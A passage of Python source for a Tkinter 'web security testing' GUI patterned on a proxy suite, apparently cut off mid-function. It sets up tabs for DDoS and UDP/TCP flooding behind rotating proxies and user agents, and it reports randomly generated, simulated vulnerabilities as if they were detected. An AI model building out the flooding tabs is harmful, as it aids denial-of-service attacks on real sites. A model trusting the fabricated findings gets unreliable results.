# glitcher_gui.py - Professional Web Security Testing Tool GUI
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import json
import requests
from urllib.parse import urlparse, urljoin
import base64
import hashlib
import random
import re
from bs4 import BeautifulSoup
import urllib3
from PIL import Image, ImageTk

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Read user agents from file
try:
    with open('user-agents.txt', 'r', encoding='utf-8') as f:
        USER_AGENTS = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    USER_AGENTS = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

CURRENT_USER_AGENT = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

class GlitcherGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Glitcher - Professional Web Security Testing Platform")
        self.root.geometry("1400x800")
        
        # Data storage
        self.requests = []
        self.vulnerabilities = []
        self.targets = []
        self.site_urls = {}  # Store URLs for each site
        self.request_counter = 0
        self.vuln_counter = 0
        self.proxies = []  # Initialize proxies list
        
        # Initialize user agent
        self.current_user_agent = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        
        # Set window title with user agent
        self.root.title(f"Glitcher - Professional Web Security Testing Platform - User-Agent: {self.current_user_agent[:30]}...")
        
        # Create user agent display at top
        self.create_user_agent_display()
        
        self.setup_ui()
        self.start_simulation()
        
    def setup_ui(self):
        # Create main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Dashboard tab
        self.dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_frame, text="Dashboard")
        self.create_dashboard_ui()
        
        # Target tab (enhanced)
        self.target_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.target_frame, text="Target")
        self.create_target_ui()
        
        # Site Package tab (new)
        self.site_package_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.site_package_frame, text="Site Package")
        self.create_site_package_ui()
        
        # Proxy tab
        self.proxy_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.proxy_frame, text="Proxy")
        self.create_proxy_ui()
        
        # Intruder tab
        self.intruder_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.intruder_frame, text="Intruder")
        self.create_intruder_ui()
        
        # Repeater tab
        self.repeater_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.repeater_frame, text="Repeater")
        self.create_repeater_ui()
        
        # Sequencer tab
        self.sequencer_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.sequencer_frame, text="Sequencer")
        self.create_sequencer_ui()
        
        # Decoder tab
        self.decoder_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.decoder_frame, text="Decoder")
        self.create_decoder_ui()
        
        # Comparer tab
        self.comparer_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.comparer_frame, text="Comparer")
        self.create_comparer_ui()
        
        # Scanner tab
        self.scanner_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.scanner_frame, text="Scanner")
        self.create_scanner_ui()
        
        # Extender tab
        self.extender_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.extender_frame, text="Extender")
        self.create_extender_ui()
        
        # UA-Gen tab
        self.ua_gen_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.ua_gen_frame, text="UA-Gen")
        self.create_ua_gen_ui()
        
        # DDoS tab
        self.ddos_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.ddos_frame, text="D-Attack")
        self.create_ddos_ui()
        
        # UDP/TCP attack tab
        self.udp_tcp_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.udp_tcp_frame, text="UDP/TCP Attack")
        self.create_udp_tcp_ui()
        
        # Proxy Management tab
        self.proxy_management_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.proxy_management_frame, text="Proxy Management")
        self.create_proxy_management_ui()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
        
    def create_dashboard_ui(self):
        # Stats frame
        stats_frame = ttk.LabelFrame(self.dashboard_frame, text="Statistics", padding=10)
        stats_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Create stat labels
        self.request_count_label = ttk.Label(stats_frame, text="Requests Intercepted: 0", font=("Arial", 12))
        self.request_count_label.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
        
        self.vuln_count_label = ttk.Label(stats_frame, text="Vulnerabilities Found: 0", font=("Arial", 12))
        self.vuln_count_label.grid(row=0, column=1, padx=10, pady=5, sticky=tk.W)
        
        self.target_count_label = ttk.Label(stats_frame, text="Active Targets: 0", font=("Arial", 12))
        self.target_count_label.grid(row=0, column=2, padx=10, pady=5, sticky=tk.W)
        
        self.scan_progress_label = ttk.Label(stats_frame, text="Scan Progress: 0%", font=("Arial", 12))
        self.scan_progress_label.grid(row=0, column=3, padx=10, pady=5, sticky=tk.W)
        
        # Activity log
        activity_frame = ttk.LabelFrame(self.dashboard_frame, text="Recent Activity", padding=10)
        activity_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.activity_log = scrolledtext.ScrolledText(activity_frame, height=20, state=tk.DISABLED)
        self.activity_log.pack(fill=tk.BOTH, expand=True)
        
        # Add sample activity
        self.log_activity("Glitcher started successfully")
        self.log_activity("Ready for security testing")
        
    def create_user_agent_display(self):
        # Create a frame at the top of the main window to show the current User-Agent
        ua_frame = ttk.Frame(self.root)
        ua_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(ua_frame, text="User-Agent:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        
        self.ua_label = ttk.Label(ua_frame, text=self.current_user_agent, font=("Arial", 10), foreground="blue")
        self.ua_label.pack(side=tk.LEFT, padx=(0, 20))
        
        # Add a button to change the User-Agent
        ttk.Button(ua_frame, text="Change User-Agent", command=self.change_user_agent).pack(side=tk.RIGHT)
        
    def change_user_agent(self):
        # Change to a new random User-Agent
        self.current_user_agent = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        self.ua_label.config(text=self.current_user_agent)
        self.root.title(f"Glitcher - Professional Web Security Testing Platform - User-Agent: {self.current_user_agent[:30]}...")
        self.log_activity(f"User-Agent changed to: {self.current_user_agent[:50]}...")
        
    def create_target_ui(self):
        # Controls
        controls_frame = ttk.Frame(self.target_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(controls_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
        self.target_url_entry = ttk.Entry(controls_frame, width=50)
        self.target_url_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        add_btn = ttk.Button(controls_frame, text="Add Target", command=self.add_target)
        add_btn.pack(side=tk.LEFT, padx=5)
        
        crawl_btn = ttk.Button(controls_frame, text="Crawl Site", command=self.crawl_site)
        crawl_btn.pack(side=tk.LEFT, padx=5)
        
        # Site map
        site_map_frame = ttk.LabelFrame(self.target_frame, text="Site Map", padding=5)
        site_map_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.site_map_tree = ttk.Treeview(site_map_frame, columns=('URL', 'Status'), show='headings')
        self.site_map_tree.heading('URL', text='URL')
        self.site_map_tree.heading('Status', text='Status')
        self.site_map_tree.column('URL', width=400)
        self.site_map_tree.column('Status', width=100)
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(site_map_frame, orient=tk.VERTICAL, command=self.site_map_tree.yview)
        h_scrollbar = ttk.Scrollbar(site_map_frame, orient=tk.HORIZONTAL, command=self.site_map_tree.xview)
        self.site_map_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.site_map_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        site_map_frame.grid_rowconfigure(0, weight=1)
        site_map_frame.grid_columnconfigure(0, weight=1)
        
    def create_site_package_ui(self):
        # Main frame for site package
        main_frame = ttk.Frame(self.site_package_frame)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left frame for sites and URLs
        left_frame = ttk.LabelFrame(main_frame, text="Sites & URLs", padding=5)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        # Sites treeview
        sites_frame = ttk.Frame(left_frame)
        sites_frame.pack(fill=tk.BOTH, expand=True)
        
        self.sites_tree = ttk.Treeview(sites_frame, columns=('Site',), show='tree headings')
        self.sites_tree.heading('#0', text='Sites')
        self.sites_tree.column('#0', width=200)
        
        # URLs treeview (nested under sites)
        urls_frame = ttk.Frame(left_frame)
        urls_frame.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        self.urls_tree = ttk.Treeview(urls_frame, columns=('URL', 'Type'), show='headings')
        self.urls_tree.heading('URL', text='URL')
        self.urls_tree.heading('Type', text='Type')
        self.urls_tree.column('URL', width=300)
        self.urls_tree.column('Type', width=100)
        
        # Bind selection event
        self.sites_tree.bind('<<TreeviewSelect>>', self.on_site_select)
        
        # Scrollbars
        sites_v_scrollbar = ttk.Scrollbar(sites_frame, orient=tk.VERTICAL, command=self.sites_tree.yview)
        sites_h_scrollbar = ttk.Scrollbar(sites_frame, orient=tk.HORIZONTAL, command=self.sites_tree.xview)
        self.sites_tree.configure(yscrollcommand=sites_v_scrollbar.set, xscrollcommand=sites_h_scrollbar.set)
        
        urls_v_scrollbar = ttk.Scrollbar(urls_frame, orient=tk.VERTICAL, command=self.urls_tree.yview)
        urls_h_scrollbar = ttk.Scrollbar(urls_frame, orient=tk.HORIZONTAL, command=self.urls_tree.xview)
        self.urls_tree.configure(yscrollcommand=urls_v_scrollbar.set, xscrollcommand=urls_h_scrollbar.set)
        
        # Pack sites elements
        self.sites_tree.grid(row=0, column=0, sticky='nsew')
        sites_v_scrollbar.grid(row=0, column=1, sticky='ns')
        sites_h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        sites_frame.grid_rowconfigure(0, weight=1)
        sites_frame.grid_columnconfigure(0, weight=1)
        
        # Pack urls elements
        self.urls_tree.grid(row=0, column=0, sticky='nsew')
        urls_v_scrollbar.grid(row=0, column=1, sticky='ns')
        urls_h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        urls_frame.grid_rowconfigure(0, weight=1)
        urls_frame.grid_columnconfigure(0, weight=1)
        
        # Right frame for vulnerabilities and analysis
        right_frame = ttk.LabelFrame(main_frame, text="Vulnerability Analysis", padding=5)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        # Notebook for different analysis types
        self.analysis_notebook = ttk.Notebook(right_frame)
        self.analysis_notebook.pack(fill=tk.BOTH, expand=True)
        
        # SQL Injection tab
        self.sql_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.sql_frame, text="SQL Injection")
        
        self.sql_results = scrolledtext.ScrolledText(self.sql_frame)
        self.sql_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # XSS tab
        self.xss_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.xss_frame, text="XSS")
        
        self.xss_results = scrolledtext.ScrolledText(self.xss_frame)
        self.xss_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Comments tab
        self.comments_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.comments_frame, text="Comments")
        
        self.comments_results = scrolledtext.ScrolledText(self.comments_frame)
        self.comments_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Hidden URLs tab
        self.hidden_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.hidden_frame, text="Hidden URLs")
        
        self.hidden_results = scrolledtext.ScrolledText(self.hidden_frame)
        self.hidden_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Bind URL selection to vulnerability analysis
        self.urls_tree.bind('<<TreeviewSelect>>', self.analyze_url)
        
    def create_proxy_ui(self):
        # Controls frame
        controls_frame = ttk.Frame(self.proxy_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.proxy_on_button = ttk.Button(controls_frame, text="Intercept: OFF", command=self.toggle_proxy)
        self.proxy_on_button.pack(side=tk.LEFT, padx=5)
        
        clear_btn = ttk.Button(controls_frame, text="Clear History", command=self.clear_proxy_history)
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        # History treeview
        history_frame = ttk.Frame(self.proxy_frame)
        history_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        columns = ('#', 'Method', 'URL', 'Status', 'Length', 'Time', 'Actions')
        self.proxy_tree = ttk.Treeview(history_frame, columns=columns, show='headings', height=20)
        
        # Define headings
        for col in columns:
            self.proxy_tree.heading(col, text=col)
            self.proxy_tree.column(col, width=100)
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(history_frame, orient=tk.VERTICAL, command=self.proxy_tree.yview)
        h_scrollbar = ttk.Scrollbar(history_frame, orient=tk.HORIZONTAL, command=self.proxy_tree.xview)
        self.proxy_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.proxy_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        history_frame.grid_rowconfigure(0, weight=1)
        history_frame.grid_columnconfigure(0, weight=1)
        
    def create_intruder_ui(self):
        # Controls frame
        controls_frame = ttk.Frame(self.intruder_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(controls_frame, text="Attack Type:").pack(side=tk.LEFT, padx=5)
        self.attack_type_var = tk.StringVar(value="Sniper")
        attack_type_combo = ttk.Combobox(controls_frame, textvariable=self.attack_type_var, 
                                        values=["Sniper", "Battering Ram", "Pitchfork", "Cluster Bomb"])
        attack_type_combo.pack(side=tk.LEFT, padx=5)
        
        start_btn = ttk.Button(controls_frame, text="Start Attack", command=self.start_intruder_attack)
        start_btn.pack(side=tk.LEFT, padx=5)
        
        clear_btn = ttk.Button(controls_frame, text="Clear", command=self.clear_intruder)
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Request editor
        request_frame = ttk.LabelFrame(self.intruder_frame, text="Request", padding=5)
        request_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.intruder_request_text = scrolledtext.ScrolledText(request_frame, height=10)
        self.intruder_request_text.pack(fill=tk.BOTH, expand=True)
        
        # Payloads
        payloads_frame = ttk.LabelFrame(self.intruder_frame, text="Payloads", padding=5)
        payloads_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.payloads_text = scrolledtext.ScrolledText(payloads_frame, height=8)
        self.payloads_text.pack(fill=tk.BOTH, expand=True)
        
        # Results
        results_frame = ttk.LabelFrame(self.intruder_frame, text="Results", padding=5)
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.intruder_results_text = scrolledtext.ScrolledText(results_frame, height=10)
        self.intruder_results_text.pack(fill=tk.BOTH, expand=True)
        
    def create_repeater_ui(self):
        # Controls
        controls_frame = ttk.Frame(self.repeater_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        send_btn = ttk.Button(controls_frame, text="Send", command=self.send_repeater_request)
        send_btn.pack(side=tk.LEFT, padx=5)
        
        reset_btn = ttk.Button(controls_frame, text="Reset", command=self.reset_repeater)
        reset_btn.pack(side=tk.LEFT, padx=5)
        
        # Request
        request_frame = ttk.LabelFrame(self.repeater_frame, text="Request", padding=5)
        request_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.repeater_request_text = scrolledtext.ScrolledText(request_frame, height=15)
        self.repeater_request_text.pack(fill=tk.BOTH, expand=True)
        
        # Response
        response_frame = ttk.LabelFrame(self.repeater_frame, text="Response", padding=5)
        response_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.repeater_response_text = scrolledtext.ScrolledText(response_frame, height=15)
        self.repeater_response_text.pack(fill=tk.BOTH, expand=True)
        
        # Add sample request
        sample_request = "GET / HTTP/1.1\nHost: example.com\nUser-Agent: Glitcher/1.0\n\n"
        self.repeater_request_text.insert(tk.END, sample_request)
        
    def create_sequencer_ui(self):
        sequencer_frame = ttk.LabelFrame(self.sequencer_frame, text="Sequencer - Randomness Analysis", padding=10)
        sequencer_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(sequencer_frame, text="Token Analysis Tool", font=("Arial", 14, "bold")).pack(pady=10)
        ttk.Label(sequencer_frame, text="Capture tokens to analyze their randomness and predictability").pack(pady=5)
        
        # Controls
        controls_frame = ttk.Frame(sequencer_frame)
        controls_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(controls_frame, text="Start Capture").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Stop Capture").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Analyze Tokens").pack(side=tk.LEFT, padx=5)
        
        # Results
        results_frame = ttk.Frame(sequencer_frame)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.sequencer_results = scrolledtext.ScrolledText(results_frame)
        self.sequencer_results.pack(fill=tk.BOTH, expand=True)
        
    def create_decoder_ui(self):
        decoder_frame = ttk.LabelFrame(self.decoder_frame, text="Decoder - Encoding/Decoding Tools", padding=10)
        decoder_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls
        controls_frame = ttk.Frame(decoder_frame)
        controls_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(controls_frame, text="Input:").pack(anchor=tk.W)
        self.decoder_input = scrolledtext.ScrolledText(controls_frame, height=5)
        self.decoder_input.pack(fill=tk.X, pady=5)
        
        # Encoding options
        options_frame = ttk.Frame(controls_frame)
        options_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(options_frame, text="Action:").pack(side=tk.LEFT)
        self.encoding_var = tk.StringVar(value="Base64 Encode")
        encoding_combo = ttk.Combobox(options_frame, textvariable=self.encoding_var,
                                     values=["Base64 Encode", "Base64 Decode", "URL Encode", "URL Decode", 
                                            "HTML Encode", "HTML Decode", "Hex Encode", "Hex Decode"])
        encoding_combo.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(options_frame, text="Convert", command=self.convert_encoding).pack(side=tk.LEFT, padx=5)
        
        # Output
        ttk.Label(controls_frame, text="Output:").pack(anchor=tk.W, pady=(10, 0))
        self.decoder_output = scrolledtext.ScrolledText(controls_frame, height=5)
        self.decoder_output.pack(fill=tk.X, pady=5)
        
    def create_comparer_ui(self):
        comparer_frame = ttk.LabelFrame(self.comparer_frame, text="Comparer - Content Comparison", padding=10)
        comparer_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Input 1
        ttk.Label(comparer_frame, text="Input 1:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, pady=5)
        self.comparer_input1 = scrolledtext.ScrolledText(comparer_frame, height=10)
        self.comparer_input1.grid(row=1, column=0, sticky="nsew", padx=(0, 5))
        
        # Input 2
        ttk.Label(comparer_frame, text="Input 2:", font=("Arial", 10, "bold")).grid(row=0, column=1, sticky=tk.W, pady=5)
        self.comparer_input2 = scrolledtext.ScrolledText(comparer_frame, height=10)
        self.comparer_input2.grid(row=1, column=1, sticky="nsew", padx=(5, 0))
        
        # Compare button
        ttk.Button(comparer_frame, text="Compare", command=self.compare_content).grid(row=2, column=0, columnspan=2, pady=10)
        
        # Results
        ttk.Label(comparer_frame, text="Comparison Results:", font=("Arial", 10, "bold")).grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=(10, 5))
        self.comparer_results = scrolledtext.ScrolledText(comparer_frame, height=8)
        self.comparer_results.grid(row=4, column=0, columnspan=2, sticky="nsew", pady=5)
        
        # Configure grid weights
        comparer_frame.grid_rowconfigure(1, weight=1)
        comparer_frame.grid_rowconfigure(4, weight=1)
        comparer_frame.grid_columnconfigure(0, weight=1)
        comparer_frame.grid_columnconfigure(1, weight=1)
        
    def create_scanner_ui(self):
        scanner_frame = ttk.LabelFrame(self.scanner_frame, text="Scanner - Automated Vulnerability Detection", padding=10)
        scanner_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls
        controls_frame = ttk.Frame(scanner_frame)
        controls_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(controls_frame, text="Target:").pack(side=tk.LEFT)
        self.scanner_target = ttk.Entry(controls_frame, width=40)
        self.scanner_target.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        ttk.Button(controls_frame, text="Start Scan", command=self.start_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Stop Scan").pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.scan_progress = ttk.Progressbar(scanner_frame, mode='determinate')
        self.scan_progress.pack(fill=tk.X, pady=10)
        
        # Results
        results_frame = ttk.LabelFrame(scanner_frame, text="Scan Results", padding=5)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.scanner_results = scrolledtext.ScrolledText(results_frame)
        self.scanner_results.pack(fill=tk.BOTH, expand=True)
        
    def create_ua_gen_ui(self):
        # Main frame for UA-Gen
        ua_gen_main_frame = ttk.LabelFrame(self.ua_gen_frame, text="User-Agent Generator", padding=10)
        ua_gen_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Questions frame
        questions_frame = ttk.LabelFrame(ua_gen_main_frame, text="Select Options", padding=10)
        questions_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Operating System selection
        ttk.Label(questions_frame, text="Operating System:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.os_var = tk.StringVar(value="Any")
        os_options = ["Any", "Windows", "Mac", "Linux", "Android", "iOS"]
        self.os_combo = ttk.Combobox(questions_frame, textvariable=self.os_var, values=os_options, state="readonly")
        self.os_combo.grid(row=0, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Device selection
        ttk.Label(questions_frame, text="Device Type:", font=("Arial", 10, "bold")).grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.device_var = tk.StringVar(value="Any")
        device_options = ["Any", "Desktop", "Mobile", "Tablet"]
        self.device_combo = ttk.Combobox(questions_frame, textvariable=self.device_var, values=device_options, state="readonly")
        self.device_combo.grid(row=1, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Browser selection
        ttk.Label(questions_frame, text="Browser:", font=("Arial", 10, "bold")).grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.browser_var = tk.StringVar(value="Any")
        browser_options = ["Any", "Chrome", "Firefox", "Safari", "Edge", "Opera"]
        self.browser_combo = ttk.Combobox(questions_frame, textvariable=self.browser_var, values=browser_options, state="readonly")
        self.browser_combo.grid(row=2, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Number of User-Agents to generate
        ttk.Label(questions_frame, text="How many to generate:", font=("Arial", 10, "bold")).grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.count_var = tk.StringVar(value="5")
        self.count_spinbox = tk.Spinbox(questions_frame, from_=1, to=100, textvariable=self.count_var, width=10)
        self.count_spinbox.grid(row=3, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Generate button
        self.generate_btn = ttk.Button(questions_frame, text="Generate User-Agents", command=self.generate_user_agents)
        self.generate_btn.grid(row=4, column=0, columnspan=2, pady=10)
        
        # Results frame
        results_frame = ttk.LabelFrame(ua_gen_main_frame, text="Generated User-Agents", padding=10)
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Text area for generated User-Agents
        self.ua_results_text = scrolledtext.ScrolledText(results_frame, height=15)
        self.ua_results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add to file button
        button_frame = ttk.Frame(ua_gen_main_frame)
        button_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.add_to_file_btn = ttk.Button(button_frame, text="Add to user-agents.txt", command=self.add_to_user_agents_file, state=tk.DISABLED)
        self.add_to_file_btn.pack(side=tk.RIGHT, padx=5)
    
    def create_extender_ui(self):
        extender_frame = ttk.LabelFrame(self.extender_frame, text="Extender - BApp Store & Extensions", padding=10)
        extender_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(extender_frame, text="Extension Management", font=("Arial", 14, "bold")).pack(pady=10)
        ttk.Label(extender_frame, text="Manage and install extensions for enhanced functionality").pack(pady=5)
        
        # Controls
        controls_frame = ttk.Frame(extender_frame)
        controls_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(controls_frame, text="Install Extension").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Remove Extension").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Reload Extensions").pack(side=tk.LEFT, padx=5)
        
        # Installed extensions list
        extensions_frame = ttk.LabelFrame(extender_frame, text="Installed Extensions", padding=5)
        extensions_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        columns = ('Name', 'Version', 'Status', 'Actions')
        self.extensions_tree = ttk.Treeview(extensions_frame, columns=columns, show='headings')
        
        for col in columns:
            self.extensions_tree.heading(col, text=col)
            self.extensions_tree.column(col, width=150)
        
        # Add sample extensions
        extensions = [
            ("SQLi Scanner", "1.2.0", "Active"),
            ("XSS Detector", "1.0.5", "Active"),
            ("Auth Analyzer", "0.9.8", "Inactive"),
            ("API Inspector", "2.1.0", "Active")
        ]
        
        for ext in extensions:
            self.extensions_tree.insert('', tk.END, values=ext + ("Manage",))
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(extensions_frame, orient=tk.VERTICAL, command=self.extensions_tree.yview)
        h_scrollbar = ttk.Scrollbar(extensions_frame, orient=tk.HORIZONTAL, command=self.extensions_tree.xview)
        self.extensions_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.extensions_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        extensions_frame.grid_rowconfigure(0, weight=1)
        extensions_frame.grid_columnconfigure(0, weight=1)
        
    def toggle_proxy(self):
        if self.proxy_on_button['text'] == "Intercept: OFF":
            self.proxy_on_button['text'] = "Intercept: ON"
            self.proxy_on_button.configure(style='Danger.TButton')
            self.log_activity("Proxy interception enabled")
        else:
            self.proxy_on_button['text'] = "Intercept: OFF"
            self.proxy_on_button.configure(style='TButton')
            self.log_activity("Proxy interception disabled")
    
    def clear_proxy_history(self):
        for item in self.proxy_tree.get_children():
            self.proxy_tree.delete(item)
        self.requests = []
        self.update_dashboard_stats()
        self.log_activity("Proxy history cleared")
    
    def simulate_request(self):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        domains = ['example.com', 'test.com', 'demo.org', 'sample.net', 'site.edu']
        paths = ['/login', '/api/users', '/admin', '/dashboard', '/profile', '/api/data', '/auth', '/upload']
        statuses = [200, 201, 400, 401, 403, 404, 500]
        
        method = random.choice(methods)
        domain = random.choice(domains)
        path = random.choice(paths)
        status = random.choice(statuses)
        length = random.randint(100, 5000)
        time_ms = round(random.random() * 1000, 2)
        
        request = {
            'id': self.request_counter + 1,
            'method': method,
            'url': f'https://{domain}{path}',
            'status': status,
            'length': length,
            'time': time_ms
        }
        
        self.requests.append(request)
        self.request_counter += 1
        
        # Add to treeview
        self.proxy_tree.insert('', tk.END, values=(
            request['id'],
            request['method'],
            request['url'],
            request['status'],
            request['length'],
            f"{request['time']}ms",
            "Actions"
        ))
        
        self.update_dashboard_stats()
        
        # Simulate potential vulnerabilities
        if method == 'POST' and 'login' in path:
            self.detect_vulnerability(request)
        
        return request
    
    def detect_vulnerability(self, request):
        vuln_types = ['SQL Injection', 'XSS', 'CSRF', 'IDOR', 'SSRF']
        vuln_type = random.choice(vuln_types)
        
        vulnerability = {
            'id': self.vuln_counter + 1,
            'type': vuln_type,
            'severity': random.choice(['High', 'Medium', 'Low']),
            'request': request,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        self.vulnerabilities.append(vulnerability)
        self.vuln_counter += 1
        self.update_dashboard_stats()
        self.log_activity(f"Potential {vuln_type} vulnerability detected on {request['url']}")
    
    def add_target(self):
        target_url = self.target_url_entry.get().strip()
        
        if not target_url:
            messagebox.showwarning("Warning", "Please enter a target URL")
            return
        
        try:
            # Validate URL format
            result = urlparse(target_url)
            if not result.scheme or not result.netloc:
                messagebox.showerror("Error", "Please enter a valid URL (include http:// or https://)")
                return
            
            # Add to targets list
            target_entry = {
                'id': len(self.targets) + 1,
                'url': target_url,
                'status': 'Active'
            }
            
            self.targets.append(target_entry)
            
            # Add to treeview
            self.site_map_tree.insert('', tk.END, values=(target_url, 'Active'))
            
            # Also add to sites tree in Site Package
